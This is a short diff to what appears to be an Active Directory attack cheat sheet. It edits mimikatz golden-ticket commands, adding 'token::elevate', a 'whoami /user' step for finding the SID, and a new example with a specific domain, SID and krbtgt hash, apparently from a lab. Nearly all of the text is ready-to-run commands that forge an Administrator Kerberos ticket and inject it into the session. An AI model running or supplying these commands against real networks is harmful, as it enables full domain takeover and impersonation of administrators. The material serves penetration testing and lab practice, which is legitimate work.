@@ -712,10 +712,15 @@ impacket-getST -spn cifs/dc01.corp.local -impersonate administrator corp.local/w
 ########################################  
   
 # Forge a kerberos TGT using krbtgt hash  
-.\mimikatz.exe "kerberos::golden /user:Administrator /domain:<DomainFQDN> /sid:<DomainSID> /krbtgt:<KRBTGT_HASH> /ptt" "exit"  
+.\mimikatz.exe "token::elevate"  "kerberos::golden /user:Administrator /domain:<DomainFQDN> /sid:<DomainSID> /krbtgt:<KRBTGT_HASH> /ptt" "exit"  
 
 # Example  
-.\mimikatz.exe "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-123456789-234567890-345678901 /krbtgt:6f1e6d9a4f7a6f8c3c1d3a4b5c6d7e8f /ptt" "exit"
+.\mimikatz.exe "token::elevate"  "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-123456789-234567890-345678901 /krbtgt:6f1e6d9a4f7a6f8c3c1d3a4b5c6d7e8f /ptt" "exit"
+
+# To get the SID
+whoami /user
+
+.\mimikatz.exe "token::elevate" "kerberos::golden /user:Administrator /domain:sub.poseidon.yzx /sid:S-1-5-21-4168247447-1722543658-2110108262 /krbtgt:80f23a248d39b8cb93df3a4a2f4199a1 /ptt" "exit"  
 ```
 
 
